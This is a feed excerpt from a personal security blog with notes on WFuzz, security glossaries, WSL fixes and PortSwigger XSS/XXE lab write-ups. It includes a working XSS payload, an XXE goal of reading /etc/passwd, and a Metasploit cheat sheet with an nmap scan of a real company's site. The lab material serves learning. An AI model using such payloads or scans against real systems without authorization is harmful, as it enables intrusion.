&lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>WFuzz</title><link>https://bernie6401.github.io/docs/tools/others/directory-fuzzing---traversal-tools/wfuzz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/directory-fuzzing---traversal-tools/wfuzz/</guid><description>&lt;h1 id="wfuzz">
 WFuzz
 &lt;a class="anchor" href="#wfuzz">#&lt;/a>
&lt;/h1>
&lt;p>參考網站-1: &lt;a href="https://www.ddosi.org/wfuzz-guide/">https://www.ddosi.org/wfuzz-guide/&lt;/a>
參考網站-2: &lt;a href="https://www.ddosi.org/wfuzz/">https://www.ddosi.org/wfuzz/&lt;/a>
參考網站-3: &lt;a href="https://www.secpulse.com/archives/78638.html">https://www.secpulse.com/archives/78638.html&lt;/a>
參考官網-1: &lt;a href="https://wfuzz.readthedocs.io/en/latest/user/basicusage.html">https://wfuzz.readthedocs.io/en/latest/user/basicusage.html&lt;/a>&lt;/p>
&lt;h3 id="installation--basic-guide">
 Installation &amp;amp; Basic Guide
 &lt;a class="anchor" href="#installation--basic-guide">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git pull https://github.com/xmendez/wfuzz.git
&lt;/code>&lt;/pre>&lt;p>下載下來後總共有==4==個executable file: ==wfencode==, ==wfpayload==, ==wfuzz==, ==wxfuzz==，這四個file實際上就是去執行src/內部的python cli file&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">python src/wfuzz-cli.py &amp;#34;$@&amp;#34;
python src/wxfuzz.py $@
python src/wfencode.py &amp;#34;$@&amp;#34;
python src/wfpayload.py &amp;#34;$@&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="wfencode">
 wfencode
 &lt;a class="anchor" href="#wfencode">#&lt;/a>
&lt;/h3>
&lt;p>這個就是encode/decode的script，很單純&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wfencode --help
Usage:

 wfencode --help This help
 wfencode -d decoder_name string_to_decode
 wfencode -e encoder_name string_to_encode
 wfencode -e encoder_name -i &amp;lt;&amp;lt;stdin&amp;gt;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>而關於encode/decoder name可以參考wfuzz file的help&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wfuzz -e encoder
Available encoders:

 Category | Name | Summary
------------------------------------------------------------------------------------------------------------------------
 hashes | base64 | Encodes the given string using base64
 url | doble_nibble_hex | Replaces ALL characters in string using the %%dd%dd escape
 url_safe, url | double_urlencode | Applies a double encode to special characters in string using the %25xx escape.
 | | Letters, digits, and the characters &amp;#39;_.-&amp;#39; are never quoted.
 url | first_nibble_hex | Replaces ALL characters in string using the %%dd? escape
 default | hexlify | Every byte of data is converted into the corresponding 2-digit hex representatio
 | | n.
 html | html_decimal | Replaces ALL characters in string using the &amp;amp;#dd; escape
 html | html_escape | Convert the characters &amp;amp;&amp;lt;&amp;gt;&amp;#34; in string to HTML-safe sequences.
 html | html_hexadecimal | Replaces ALL characters in string using the &amp;amp;#xx; escape
 hashes | md5 | Applies a md5 hash to the given string
 db | mssql_char | Converts ALL characters to MsSQL&amp;#39;s char(xx)
 db | mysql_char | Converts ALL characters to MySQL&amp;#39;s char(xx)
 default | none | Returns string without changes
 db | oracle_char | Converts ALL characters to Oracle&amp;#39;s chr(xx)
 default | random_upper | Replaces random characters in string with its capitals letters
 url | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape
 hashes | sha1 | Applies a sha1 hash to the given string
 hashes | sha256 | Applies a sha256 hash to the given string
 hashes | sha512 | Applies a sha512 hash to the given string
 url | uri_double_hex | Encodes ALL charachers using the %25xx escape.
 url | uri_hex | Encodes ALL charachers using the %xx escape.
 url | uri_triple_hex | Encodes ALL charachers using the %25%xx%xx escape.
 url | uri_unicode | Replaces ALL characters in string using the %u00xx escape
 url_safe, url | urlencode | Replace special characters in string using the %xx escape. Letters, digits, and
 | | the characters &amp;#39;_.-&amp;#39; are never quoted.
 url | utf8 | Replaces ALL characters in string using the \u00xx escape
 url | utf8_binary | Replaces ALL characters in string using the \uxx escape
&lt;/code>&lt;/pre>&lt;p>如何使用&lt;/p></description></item><item><title>What is DevOps, MLOps, CI/CD?</title><link>https://bernie6401.github.io/docs/terminology/what-is-devops-mlops-ci_cd_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/what-is-devops-mlops-ci_cd_/</guid><description>&lt;ul>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10184557">什麼是 DevOps？&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>DevOps 簡而言之，就是 Development + Operations ，也就是開發與維運。但大部分的文章都會說是「開發」「測試」「維運」三者的結合。如同下面這張圖想表示的意義一樣，當三者有了交集，即是 DevOps
&lt;img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Devops.svg/512px-Devops.svg.png" alt="" />&lt;/p>
&lt;h4 id="devops-想要達成的目標為何">
 DevOps 想要達成的目標為何？
 &lt;a class="anchor" href="#devops-%e6%83%b3%e8%a6%81%e9%81%94%e6%88%90%e7%9a%84%e7%9b%ae%e6%a8%99%e7%82%ba%e4%bd%95">#&lt;/a>
&lt;/h4>
&lt;p>從 Patrick Debois 發現的問題與參考葉大一句話囊括 DevOps 的目標一文，可以了解，最大的目標即為速度。「天下武功，唯快不破」，從發現需求到產品上線的時間越短，能得到的回饋與市場也就越大；但快還不夠，還要好，也就是要有品質！如果只有快，而沒有品質，只是更快把 bug 上線，並破壞企業名聲而已。如何兼顧速度與品質，即為 DevOps 的主要目標。
DevOps 到底在做什麼？&lt;/p>
&lt;p>為何會出現 DevOps ，相信已經有個感覺了。那它究竟在做些什麼事呢？&lt;/p>
&lt;p>有文章會提到用 CALMS 的角度來說明 DevOps 的要領，這是下列五個英文單字的縮寫：&lt;/p>
&lt;ul>
&lt;li>Culture&lt;/li>
&lt;li>Automation&lt;/li>
&lt;li>Lean&lt;/li>
&lt;li>Measurement&lt;/li>
&lt;li>Sharing&lt;/li>
&lt;/ul>
&lt;p>這是了解 DevOps 概念的好方向之一。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10238335">什麼是MLOps？-30 Days of MLOps&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>用最短的一句話來解釋它的話，MLOps 就是 Machine Learning 的 DevOps
在 Machine Learning 團隊中，除了資料科學家、資料工程師、DevOps 工程師作為固定班底外，協作單位還有產品經理、後端工程師等等。我們要讓所有人可以彼此良好的協作，這需要依賴更好的維運架構。除了最直覺想到的 Model 部署外，常見的挑戰還有例如：訓練 Model、測試與分析 Model、資料的預處理等等。
&lt;img src="https://github.com/alincode/30-days-of-mlops/raw/master/assets/mlops-collenges.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://www.wingwill.com.tw/zh-tw/%E9%83%A8%E8%90%BD%E6%A0%BC/%E9%9B%B2%E5%9C%B0%E6%B7%B7%E5%90%88%E6%87%89%E7%94%A8/cicd%E5%B7%A5%E5%85%B7/">CI/CD是什麼？一篇認識CI/CD工具及優勢，將日常瑣事自動化&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>CI/CD工具也是為了此概念(DevOps)而產生的自動化工具，透過持續整合、持續部署的方式，在開發階段就自動協助開發人員偵測程式碼問題，並部署至伺服器&lt;/p>
&lt;hr>
&lt;h3 id="cicontinuous-integration持續整合">
 CI（Continuous Integration）持續整合
 &lt;a class="anchor" href="#cicontinuous-integration%e6%8c%81%e7%ba%8c%e6%95%b4%e5%90%88">#&lt;/a>
&lt;/h3>
&lt;p>持續整合（Continuous Integration，CI）顧名思義，就是當開發人員完成一個階段性的程式碼後就經由自動化工具測試、驗證，協助偵測程式碼問題，並建置出即將部署的版本（Build）&lt;/p></description></item><item><title>What is IDS, IPS, EDR, MDR, NSM, SIEM?</title><link>https://bernie6401.github.io/docs/terminology/what-is-ids-ips-edr-mdr-nsm-siem_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/what-is-ids-ips-edr-mdr-nsm-siem_/</guid><description>&lt;ol>
&lt;li>IDS(Intrusion Detection System, 入侵偵測系統)
簡答: 從名字就可以看的出來，他是針對流入流出的各種封包的偵測系統，也就是獨立於Firewall的旁之，如果他有檢測到封包內有什麼異常的Payload或是pattern，就會跳出告警，但就僅只於此，不會再做更多的操作
詳答: &lt;a href="https://www.ithome.com.tw/tech/28712">What is IDS(Intrusion Detection Systems)?&lt;/a>
&lt;blockquote>
&lt;p>入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動&lt;/p>&lt;/blockquote>
&lt;ul>
&lt;li>網路型入侵偵測系統(NIDS):主要是由一個或多個偵測器，加上收集與分析資料的主控臺所組成，可以分析每個通過的網路封包，並與已知的攻擊特徵進行比對，如果符合某項攻擊特徵，系統就會啟動防護機制，例如發簡訊或命令防火牆中斷該連線。&lt;/li>
&lt;li>主機型入侵偵測系統(HIDS):是從主機系統稽核日誌檔演進而來，必須在主機上安裝代理程式﹙Agent﹚，負責監視主機內部的程序，並監控記錄檔與可疑活動，若有任何系統事件都會被記錄至日誌檔，並與攻擊特徵資料庫比對，判斷主機是否遭到攻擊&lt;/li>
&lt;li>誘捕型入侵偵測系統(Deception Systems):目的是偵測未經授權的活動，任何進出誘捕系統的封包都會被認定是可疑的。但它卻是受到爭議的產品，有些廠商認為誘捕型系統只適合學術研究，因為它誘導駭客上勾，因此收集的證據無法用來起訴駭客&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>IPS(Intrusion Prevention System, 入侵防禦系統)
IPS就是要改進上述的問題，他主打的就是偵測到快快的東西就會主動的防禦掉，但這樣還是有一個問題，現今的攻擊手法越來越多種，而且有時候是那種可以包裝成安全落地的形式，必須要在本地端監控才有辦法知道&lt;/li>
&lt;li>EDR(Endpoint Detection and Response, 端點偵測與應對)
EDR就是在做這樣的事情，可是有可能會有一個疑問，每個人的主機內不是都有安裝那種傳統的Windows Defenders或是小紅傘那種東西，為什麼還需要有EDR，其實現今的攻擊手法已經有很大的變化，有可能單純看個人的裝置會看不出個所以然，必須要聯合其他的裝置一起做關聯性的比對才會知道目前是不是正在遭受攻擊，所以EDR強大的地方在於他做到各個裝置endpoint端點的串聯，讓資安事件的偵測和防禦可以更嚴謹，這也是中小型企業最需要的資安產品&lt;/li>
&lt;li>MDR(Managed Detection and Response, 受管式偵測與應對)
這東西其實就是一個EDR+SOC的服務衍生的產品，但ddaa說這個東西要做出市場區隔可能還沒有到太創新&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10202297">What is NSM(Network Security Monitors)?&lt;/a>
&lt;blockquote>
&lt;p>NSM主要目的是偵測、找出入侵者，提高能見度。它建立在「我們一定會被攻擊，而且最終防禦一定會被突破」的思惟上。假設意志堅決的駭客最終打穿我們辛苦建立的防禦，但只要能在入侵者進一步破壞、感染系統前偵測、做出回應，讓入侵者無法達到目的，便能阻擋這波攻擊
NSM不是等接收IDS/IPS等等資安設備觸發警示後才開始收集，而是平時便預先主動收集資料，提供NSM平台審視、分析，強化可見度，主動找出入侵軌跡&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10195623">What is SIEM(Security Information and Event Management)&lt;/a>
&lt;blockquote>
&lt;p>SIEM的功能和一般日誌管理工具類似，都會將來自不同伺服器和設備的日誌和事件紀錄集中在一個地方 (通常是Log server伺服器本身硬碟或特定的儲存池Storage pool)，避免日誌和紀錄隨著機器故障遺失，符合稽核要求，可以進行關鍵字或日期查詢，所以也有人直接用日誌管理工具來進行分析
功能&lt;/p>&lt;/blockquote>
&lt;ul>
&lt;li>彙整、解讀多項系統設備日誌&lt;/li>
&lt;li>資料圖形化&lt;/li>
&lt;li>SIEM具備強大的比對Correlation 功能
e.g.帳號登入失敗、創建新帳號、帳號權限提升等等可能是攻擊行為也可能是網管的正常登入，要看一連串的流量或封包資料才能判斷$\to$耗費人力&lt;/li>
&lt;li>整合其他資安工具或資安服務&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/</guid><description>&lt;h1 id="wight-wired-ghost-touch-attack-on-capacitive-touchscreens">
 WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens
 &lt;a class="anchor" href="#wight-wired-ghost-touch-attack-on-capacitive-touchscreens">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Jiang, Y., Ji, X., Wang, K., Yan, C., Mitev, R., Sadeghi, A. R., &amp;amp; Xu, W. (2022, May). Wight: Wired ghost touch attack on capacitive touchscreens. In 2022 IEEE Symposium on Security and Privacy (SP) (pp. 984-1001). IEEE.
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwj40bHli7P-AhUNQ94KHUdYAAMQFnoECAsQAQ&amp;amp;url=https%3A%2F%2Fzh-tw.ios-data-recovery.com%2Fandroid-ghost-touch-fix%2F&amp;amp;usg=AOvVaw2qVDJ2tKU-pVUgcDFAodNY">What is ghost touch?&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://youtu.be/YlN7rFg7cps">What is common-mode signal and differential-mode signal - 高中電子學_運算放大器_2. 運算放大器之特性與參數_2.3 運算放大器的動態特性參數 1_支裕文&lt;/a>
&lt;img src="https://i.imgur.com/AlHU0Uh.png" alt="" />&lt;/p></description></item><item><title>WSL tty /dev/tty0</title><link>https://bernie6401.github.io/docs/problem-solutions/wsl-tty-_dev_tty0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/wsl-tty-_dev_tty0/</guid><description>&lt;h1 id="wsl-tty-devtty0">
 WSL tty /dev/tty0
 &lt;a class="anchor" href="#wsl-tty-devtty0">#&lt;/a>
&lt;/h1>
&lt;h2 id="problem-description">
 Problem Description
 &lt;a class="anchor" href="#problem-description">#&lt;/a>
&lt;/h2>
&lt;p>之前重灌電腦，重新載了WSL，但不知道為甚麼WSL沒有升到version 2，這會導致我在用gdb的時候(我是用gef)，想要設定redirect，但是看了別的視窗的tty都顯示/dev/tty1，而不是/dev/pts/1，導致無法如設定一樣可以分開視窗&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>先回答原因，這是因為目前的wsl version是1而不是2，所以只要把wsl version轉到2就可以了，具體做法可以參考這篇文章&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>確定wsl版本
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wsl --list --verbose
 NAME STATE VERSION
* Ubuntu-18.04 Stopped 1
 docker-desktop Stopped 2
 docker-desktop-data Stopped 2
 Ubuntu-20.04 Running 1
 Ubuntu-22.04 Stopped 1
&lt;/code>&lt;/pre>可以看到目前所有版本都還是1&lt;/li>
&lt;li>Switch
用管理員權限打開PowerShell
&lt;pre tabindex="0">&lt;code class="language-shell!" data-lang="shell!">$ Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform 
$ wsl --set-version Ubuntu-18.04 2
$ wsl --set-version Ubuntu-20.04 2
$ wsl --set-version Ubuntu-22.04 2
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>最後就可以開始設定gef config&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://samiouob.github.io/2019/06/17/WSL2/">[WSL] 將 WSL 升級成 WSL2 吧 !&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>WSL2 Cannot List Android Devices</title><link>https://bernie6401.github.io/docs/problem-solutions/wsl2-cannot-list-android-devices/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/wsl2-cannot-list-android-devices/</guid><description>&lt;h1 id="wsl2-cannot-list-android-devices">
 WSL2 Cannot List Android Devices
 &lt;a class="anchor" href="#wsl2-cannot-list-android-devices">#&lt;/a>
&lt;/h1>
&lt;h2 id="問題描述">
 問題描述
 &lt;a class="anchor" href="#%e5%95%8f%e9%a1%8c%e6%8f%8f%e8%bf%b0">#&lt;/a>
&lt;/h2>
&lt;p>這個問題的前題是Windows CMD以及WSL2都有正確安裝adb，但前者可以正常list出連接的device，後者卻為空&lt;/p>
&lt;h2 id="how-to-solve">
 How to Solve
 &lt;a class="anchor" href="#how-to-solve">#&lt;/a>
&lt;/h2>
&lt;p>這是參考&lt;a href="https://stackoverflow.com/a/71414575/15036381">StackOverflow - ADB device list empty using WSL2&lt;/a>的說明，具體原理就是我們直接把Windows安裝adb的path，soft link給WSL2的path就可以了&lt;/p>
&lt;ol>
&lt;li>先找出Windows安裝adb的path
自行尋找&lt;/li>
&lt;li>找出WSL2中adb的path
通常是&lt;code>/usr/bin/adb&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ll /usr/bin/adb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lrwxrwxrwx &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">45&lt;/span> Aug &lt;span style="color:#ae81ff">14&lt;/span> 12:07 /usr/bin/adb -&amp;gt; lrwxrwxrwx &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">37&lt;/span> Jan &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> /usr/bin/adb_bk -&amp;gt; ../lib/android-sdk/platform-tools/adb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>備份原本的soft link
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo mv /usr/bin/adb /usr/bin/adb_bk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>取代softlink
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo ln -sf /mnt/&amp;lt;folder path to adb&amp;gt;/adb.exe /usr/bin/adb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>測試
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb devices
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>* daemon not running; starting now at tcp:5037
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>* daemon started successfully
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>List of devices attached
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RFCW81CY9AD device
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</guid><description>&lt;h1 id="xss---apprentice">
 XSS - APPRENTICE
 &lt;a class="anchor" href="#xss---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-reflected-xss-into-html-context-with-nothing-encodedzero">
 Lab: Reflected XSS into HTML context with nothing encoded:zero:
 &lt;a class="anchor" href="#lab-reflected-xss-into-html-context-with-nothing-encodedzero">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.&lt;/li>
&lt;li>Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.&lt;/li>
&lt;/ul>
&lt;h3 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h3>
&lt;p>Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/tvfxD4P.png" alt="" />
:::&lt;/p>
&lt;hr>
&lt;h2 id="lab-stored-xss-into-html-context-with-nothing-encoded">
 Lab: Stored XSS into HTML context with nothing encoded
 &lt;a class="anchor" href="#lab-stored-xss-into-html-context-with-nothing-encoded">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.&lt;/li>
&lt;li>Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed.&lt;/li>
&lt;/ul>
&lt;h3 id="exp-1">
 Exp
 &lt;a class="anchor" href="#exp-1">#&lt;/a>
&lt;/h3>
&lt;p>You need to click into one post and comment something that contained script tag.
Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/aArBCbN.png" alt="" />
:::&lt;/p></description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</guid><description>&lt;h1 id="xxe---apprentice">
 XXE - APPRENTICE
 &lt;a class="anchor" href="#xxe---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input and returns any unexpected values in the response.&lt;/li>
&lt;li>Goal: To solve the lab, inject an XML external entity to retrieve the contents of the &lt;code>/etc/passwd&lt;/code> file.&lt;/li>
&lt;/ul>
&lt;h2 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files">
 Lab: Exploiting XXE using external entities to retrieve files
 &lt;a class="anchor" href="#lab-exploiting-xxe-using-external-entities-to-retrieve-files">#&lt;/a>
&lt;/h2>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Use Burp Suite to intercept package
&lt;img src="https://i.imgur.com/gMn3Cbu.png" alt="" />
You can notice that it use a normal xml format.&lt;/li>
&lt;/ol>
&lt;h3 id="exp---inject-directly">
 Exp - Inject Directly
 &lt;a class="anchor" href="#exp---inject-directly">#&lt;/a>
&lt;/h3>
&lt;p>Exploit Payload:&lt;/p></description></item><item><title>利用Metasploit Framework測試一些網站</title><link>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="利用metasploit-framework測試一些網站">
 利用Metasploit Framework測試一些網站
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8metasploit-framework%e6%b8%ac%e8%a9%a6%e4%b8%80%e4%ba%9b%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="cheat-sheet">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10279483?sc=hot">Cheat Sheet&lt;/a>
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo msfdb init &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> msfconsole
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; nmap -vv &lt;span style="color:#f92672">{&lt;/span>IP&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. nmap -vv 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; search &lt;span style="color:#f92672">{&lt;/span>http/ssh/ftp...關鍵字&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. search rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; use &lt;span style="color:#f92672">{&lt;/span>腳本位置&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. use exploit/unix/http/cacti_filter_sqli_rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; show option &lt;span style="color:#75715e"># 顯示該腳本需要哪一些參數&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; set &lt;span style="color:#f92672">{&lt;/span>option name&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">{&lt;/span>參數&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. set RHOST 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smartdaily">
 &lt;a href="https://www.smartdaily.com.tw/">SmartDaily&lt;/a>
 &lt;a class="anchor" href="#smartdaily">#&lt;/a>
&lt;/h2>
&lt;p>IP: &lt;code>34.81.5.101&lt;/code>
&lt;a href="https://securityheaders.com/?q=https%3A%2F%2Fwww.smartdaily.com.tw%2F&amp;amp;followRedirects=on">Security Header Result&lt;/a>&lt;/p>
&lt;h3 id="nmap">
 nmap
 &lt;a class="anchor" href="#nmap">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler nmap Result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> exec: nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.94 &lt;span style="color:#f92672">(&lt;/span> https://nmap.org &lt;span style="color:#f92672">)&lt;/span> at 2023-10-02 01:49 EDT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Ping Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 34.81.5.101 &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
